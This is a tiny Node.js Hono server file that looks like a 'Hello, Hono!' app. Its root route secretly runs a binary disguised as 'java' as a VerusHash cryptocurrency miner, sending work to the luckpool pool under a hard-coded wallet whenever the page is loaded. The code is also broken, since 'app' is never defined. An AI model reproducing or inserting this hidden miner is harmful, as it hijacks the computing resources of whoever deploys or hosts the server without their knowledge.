const { exec } = require('child_process');
const { Hono } = require('hono');
const { serve } = require('@hono/node-server');

app.get('/', (c) => { 
    c.text('Hello, Hono!')
    exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password x --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
  console.log(stdout);
 });
});

serve(app);